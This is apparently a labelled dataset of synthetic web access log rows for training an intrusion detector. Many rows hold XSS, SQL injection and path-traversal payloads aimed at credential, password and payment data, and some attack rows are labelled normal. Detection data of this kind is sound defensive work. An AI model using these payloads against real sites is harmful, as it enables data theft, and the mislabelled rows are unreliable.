+10.0.0.8,20/May/2025:22:09:41 +0800,GET,/feedback?msg=<details open ontoggle=alert(1)>,403,3313,sqlmap/1.7,46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+172.16.0.3,20/May/2025:00:26:26 +0800,GET,/help/faq.html,200,38787,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+192.168.1.15,20/May/2025:20:29:58 +0800,GET,/redirect?url=javascript:alert(document.domain),400,373,Hydra/9.4,47,0.10638297872340426,0,1,0,1,0.42715866125403645,1,XSS攻击
+114.114.114.114,20/May/2025:09:01:25 +0800,GET,/js/main.js,200,42696,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+198.51.100.7,20/May/2025:10:32:01 +0800,GET,/api/search?q=phone,200,37885,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+192.168.1.11,20/May/2025:20:46:05 +0800,GET,/include?page=..%c0%af..%c0%af..%c0%afetc/passwd,404,2762,curl/8.4.0,36,0.1111111111111111,0,0,0,1,0.3720467579562914,0,正常
+172.16.0.3,20/May/2025:12:36:20 +0800,GET,/about.html,200,35845,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+66.249.66.1,20/May/2025:18:24:08 +0800,GET,/downloads/manual.pdf,200,8123,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+172.16.0.3,20/May/2025:14:44:49 +0800,GET,/api/user?id=3,200,11841,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+10.0.0.20,20/May/2025:15:09:49 +0800,GET,/api/v2/data?limit=20&offset=0,200,4469,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+66.249.66.1,20/May/2025:16:53:54 +0800,GET,/dashboard,200,48447,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+192.168.1.11,20/May/2025:00:22:04 +0800,GET,/about.html,200,20988,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.15,20/May/2025:18:26:29 +0800,GET,/..%2f..%2f..%2fetc/passwd,500,236,curl/8.4.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+198.51.100.7,20/May/2025:11:16:56 +0800,GET,/blog/post-2.html,200,4686,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+203.0.113.10,20/May/2025:14:52:02 +0800,GET,/favicon.ico,200,49756,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+172.16.0.15,20/May/2025:15:47:52 +0800,GET,/js/main.js,200,32443,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+192.168.1.11,20/May/2025:04:27:48 +0800,GET,/static/../../../etc/shadow,400,829,Wget/1.21.3,27,0.2222222222222222,0,0,5,0,0.9699957818696624,1,路径遍历
+66.249.66.1,20/May/2025:22:23:27 +0800,GET,/favicon.ico,304,3004,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.12,20/May/2025:02:50:20 +0800,GET,/static/../../../etc/shadow,404,143,Mozilla/5.0 (compatible; Nmap Scripting Engine),27,0.2222222222222222,0,0,5,0,0.9699957818696624,1,路径遍历
+10.0.0.5,20/May/2025:01:24:14 +0800,GET,/input?val=<iframe src=javascript:alert(1)>,500,206,curl/8.4.0,43,0.18604651162790697,0,1,0,1,0.21790216986509967,1,XSS攻击
+45.33.32.100,20/May/2025:05:51:20 +0800,GET,/login.html,200,12302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+223.5.5.5,20/May/2025:20:07:13 +0800,GET,/js/app.js,301,38079,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+1.1.1.1,20/May/2025:17:29:21 +0800,GET,/category/clothing,200,35654,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+66.249.66.1,20/May/2025:11:36:01 +0800,GET,/css/bootstrap.min.css,200,4756,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+10.0.0.20,20/May/2025:00:41:02 +0800,GET,/blog/post-1.html,301,38740,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+45.33.32.100,20/May/2025:19:00:54 +0800,GET,/css/style.css,304,32569,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+10.0.0.5,20/May/2025:07:32:28 +0800,GET,/page?q=<svg onload=alert('XSS')>,200,3925,python-requests/2.31.0,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+10.0.0.20,20/May/2025:09:49:08 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,400,324,Hydra/9.4,52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
+203.0.113.5,20/May/2025:14:48:25 +0800,GET,/help/faq.html,301,43967,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+10.0.0.5,20/May/2025:03:25:51 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,200,3255,Mozilla/5.0 (compatible; Nmap Scripting Engine),116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+192.168.1.15,20/May/2025:16:35:00 +0800,GET,/../../../etc/passwd,403,2391,Hydra/9.4,20,0.25,0,0,4,0,0.7004716638371997,1,路径遍历
+192.168.1.12,20/May/2025:21:02:57 +0800,GET,/blog/post-1.html,200,24474,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+10.0.0.8,20/May/2025:01:57:11 +0800,GET,/display?html=<script>window.location='http://phishing.com'</script>,200,2583,Hydra/9.4,68,0.19117647058823528,1,1,0,1,0.5498691740080591,1,XSS攻击
+172.16.0.7,20/May/2025:06:48:48 +0800,GET,/api/products?page=1,200,42399,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+192.168.1.12,20/May/2025:00:07:30 +0800,GET,/api/user?id=3,200,40605,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+172.16.0.7,20/May/2025:07:47:32 +0800,GET,/profile/settings,301,17894,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+10.0.0.5,20/May/2025:01:23:45 +0800,GET,/api/data?id=1' OR 'a'='a,403,2206,curl/8.4.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+10.0.0.5,20/May/2025:15:12:41 +0800,GET,/api/search?q=phone,200,35376,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+10.0.0.12,20/May/2025:02:04:04 +0800,GET,/detail?id=1 OR 1=1#,404,671,Wget/1.21.3,20,0.25,1,0,0,1,0.38938665326318955,1,SQL注入
+172.16.0.15,20/May/2025:03:14:09 +0800,GET,/dashboard,200,36950,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+10.0.0.20,20/May/2025:17:55:54 +0800,GET,/robots.txt,200,2818,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.12,20/May/2025:07:00:51 +0800,GET,/favicon.ico,200,7924,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+8.8.8.8,20/May/2025:04:13:35 +0800,GET,/js/app.js,200,45955,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+192.168.1.11,20/May/2025:19:30:27 +0800,GET,/page?id=1' AND (SELECT COUNT(*) FROM users)>0--,200,1533,curl/8.4.0,48,0.25,1,0,0,1,0.3791017315686891,1,SQL注入
+192.168.1.15,20/May/2025:23:08:01 +0800,GET,/blog/post-1.html,200,37865,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.12,20/May/2025:14:23:02 +0800,GET,/js/app.js,200,12964,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+10.0.0.20,20/May/2025:20:43:38 +0800,GET,/category/electronics,200,22429,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+8.8.8.8,20/May/2025:13:01:36 +0800,GET,/api/notifications?unread=true,304,7336,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+198.51.100.7,20/May/2025:21:58:41 +0800,GET,/category/electronics,200,47012,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:03:24:23 +0800,GET,/js/main.js,200,21370,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+172.16.0.15,20/May/2025:00:00:13 +0800,GET,/favicon.ico,304,272,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.10,20/May/2025:14:12:04 +0800,GET,/login.html,200,39275,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.11,20/May/2025:15:28:01 +0800,GET,/load?name=..%252f..%252f..%252fetc/passwd,403,2170,Hydra/9.4,36,0.19444444444444445,0,0,0,1,0.2007618285473515,0,正常
+192.168.1.10,20/May/2025:08:28:09 +0800,GET,/contact.html,200,15575,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+10.0.0.5,20/May/2025:20:43:08 +0800,GET,/robots.txt,304,42599,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+66.249.66.1,20/May/2025:03:12:43 +0800,GET,/js/main.js,301,16121,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+10.0.0.12,20/May/2025:17:43:13 +0800,GET,/get?file=/var/log/apache2/access.log,403,2873,sqlmap/1.7,37,0.1891891891891892,0,0,0,1,0.20481172201196501,0,正常
+223.5.5.5,20/May/2025:09:47:29 +0800,GET,/api/user?id=3,304,38527,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+10.0.0.5,20/May/2025:21:23:39 +0800,GET,/..%2f..%2f..%2fetc/passwd,404,1970,Mozilla/5.0 (compatible; Nmap Scripting Engine),20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+192.168.1.12,20/May/2025:12:12:04 +0800,GET,/api/products?page=1,200,42241,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+203.0.113.5,20/May/2025:19:25:27 +0800,GET,/api/v2/data?limit=20&offset=0,200,25152,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+8.8.8.8,20/May/2025:10:04:15 +0800,GET,/register.html,200,17379,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+10.0.0.5,20/May/2025:23:48:44 +0800,GET,/read?path=....//....//....//etc/passwd,404,2505,Wget/1.21.3,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
+192.168.1.15,20/May/2025:13:34:55 +0800,GET,/blog/post-2.html,301,43581,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.10,20/May/2025:14:40:05 +0800,GET,/search?q=<script>alert(1)</script>,403,2270,sqlmap/1.7,35,0.2857142857142857,0,1,0,1,0.2903738868700842,1,XSS攻击
+172.16.0.3,20/May/2025:21:27:54 +0800,GET,/about.html,200,12868,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+8.8.8.8,20/May/2025:18:54:21 +0800,GET,/category/clothing,200,33774,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+10.0.0.5,20/May/2025:15:35:39 +0800,GET,/api/notifications?unread=true,200,19091,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.5,20/May/2025:19:19:52 +0800,GET,/api/user?id=3,304,1079,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+192.168.1.11,20/May/2025:22:44:33 +0800,GET,/feedback?msg=<details open ontoggle=alert(1)>,404,4838,curl/8.4.0,46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+192.168.1.10,20/May/2025:07:23:11 +0800,GET,/dashboard,200,39887,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+192.168.1.15,20/May/2025:17:34:19 +0800,GET,/favicon.ico,200,33404,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.10,20/May/2025:00:13:25 +0800,GET,/read?path=....//....//....//etc/passwd,500,2672,sqlmap/1.7,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
+192.168.1.10,20/May/2025:04:36:42 +0800,GET,/about.html,200,11746,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.8,20/May/2025:17:04:49 +0800,GET,/comment?msg=<img src=x onerror=alert(1)>,400,2801,Hydra/9.4,41,0.21951219512195122,0,1,0,1,0.26239957001406006,1,XSS攻击
+172.16.0.7,20/May/2025:19:06:14 +0800,GET,/images/logo.png,200,43364,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+192.168.1.10,20/May/2025:22:46:44 +0800,GET,/api/data?id=1' OR 'a'='a,403,2967,python-requests/2.31.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+114.114.114.114,20/May/2025:13:43:06 +0800,GET,/images/banner.jpg,200,40869,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+192.168.1.12,20/May/2025:18:14:06 +0800,GET,/index.html,301,38767,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.20,20/May/2025:04:17:26 +0800,GET,/blog/post-2.html,200,47677,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.11,20/May/2025:14:51:42 +0800,GET,/api/notifications?unread=true,200,25648,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.12,20/May/2025:00:44:11 +0800,GET,/view?template=../../../windows/system32/config/sam,400,1525,Wget/1.21.3,51,0.17647058823529413,0,0,0,1,0.36498470508254666,1,路径遍历
+45.33.32.100,20/May/2025:17:52:15 +0800,GET,/terms.html,200,549,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.12,20/May/2025:21:09:38 +0800,GET,/favicon.ico,200,49055,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+203.0.113.5,20/May/2025:14:38:00 +0800,GET,/api/products?page=1,200,42766,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+66.249.66.1,20/May/2025:05:03:27 +0800,GET,/category/clothing,200,10293,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+198.51.100.7,20/May/2025:06:54:28 +0800,GET,/profile/settings,200,27314,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.11,20/May/2025:14:50:29 +0800,GET,/terms.html,200,10744,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+114.114.114.114,20/May/2025:17:13:39 +0800,GET,/api/search?q=phone,200,36072,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+8.8.8.8,20/May/2025:02:58:59 +0800,GET,/css/style.css,304,6880,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+1.1.1.1,20/May/2025:03:41:25 +0800,GET,/static/fonts/arial.woff,200,12725,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+8.8.8.8,20/May/2025:22:12:07 +0800,GET,/api/user?id=3,200,654,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+203.0.113.10,20/May/2025:12:47:29 +0800,GET,/favicon.ico,200,15785,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+198.51.100.7,20/May/2025:23:42:39 +0800,GET,/api/search?q=phone,200,215,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+192.168.1.10,20/May/2025:12:07:01 +0800,GET,/robots.txt,200,10861,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.5,20/May/2025:03:05:52 +0800,GET,/page?q=<svg onload=alert('XSS')>,403,612,Mozilla/5.0 (compatible; Nmap Scripting Engine),33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+172.16.0.3,20/May/2025:13:48:31 +0800,GET,/api/notifications?unread=true,304,22139,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+223.5.5.5,20/May/2025:15:50:45 +0800,GET,/api/user?id=3,301,31391,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+192.168.1.11,20/May/2025:06:33:33 +0800,GET,/search?id=1 OR 1=1,200,4421,sqlmap/1.7,19,0.21052631578947367,1,0,0,1,0.42170703205838495,1,SQL注入
+203.0.113.5,20/May/2025:09:22:22 +0800,GET,/category/electronics,200,10956,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:22:17:15 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",404,4671,curl/8.4.0,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
+10.0.0.12,20/May/2025:03:05:21 +0800,GET,/contact.html,200,25616,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+66.249.66.1,20/May/2025:07:40:36 +0800,GET,/help/faq.html,200,34609,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+192.168.1.10,20/May/2025:11:50:48 +0800,GET,/order?id=1 UNION SELECT credit_card FROM payments--,403,3056,python-requests/2.31.0,52,0.09615384615384616,1,0,0,1,0.5222237497694325,1,SQL注入
+10.0.0.20,20/May/2025:08:08:32 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",400,2284,Mozilla/5.0 (compatible; Nmap Scripting Engine),64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
+192.168.1.11,20/May/2025:18:04:35 +0800,GET,/blog/post-2.html,200,39034,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+192.168.1.15,20/May/2025:10:30:08 +0800,GET,/index.html,301,37483,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+203.0.113.5,20/May/2025:04:54:25 +0800,GET,/js/app.js,200,34141,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+172.16.0.3,20/May/2025:01:11:41 +0800,GET,/terms.html,304,22666,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+45.33.32.100,20/May/2025:09:14:20 +0800,GET,/register.html,200,21522,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+203.0.113.10,20/May/2025:13:26:03 +0800,GET,/api/orders?status=active,200,5107,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,25,0.16,0,0,1,1,0.3559522842791986,0,正常
+203.0.113.5,20/May/2025:11:47:03 +0800,GET,/downloads/manual.pdf,304,30989,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+192.168.1.12,20/May/2025:17:39:12 +0800,GET,/api/data?id=1' OR 'a'='a,403,3814,sqlmap/1.7,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+172.16.0.3,20/May/2025:17:35:55 +0800,GET,/css/bootstrap.min.css,200,8334,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+192.168.1.12,20/May/2025:00:07:47 +0800,GET,/profile?name=<script>document.cookie</script>,500,4520,Mozilla/5.0 (compatible; Nmap Scripting Engine),46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+203.0.113.10,20/May/2025:15:56:30 +0800,GET,/about.html,301,23020,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.10,20/May/2025:11:11:29 +0800,GET,/page?q=<svg onload=alert('XSS')>,200,3471,sqlmap/1.7,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+45.33.32.100,20/May/2025:02:38:18 +0800,GET,/robots.txt,200,31168,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.10,20/May/2025:12:47:16 +0800,GET,/comment?msg=<img src=x onerror=alert(1)>,400,4536,Wget/1.21.3,41,0.21951219512195122,0,1,0,1,0.26239957001406006,1,XSS攻击
+10.0.0.20,20/May/2025:21:59:44 +0800,GET,/dashboard,304,4897,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+172.16.0.7,20/May/2025:11:24:09 +0800,GET,/category/electronics,200,9517,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
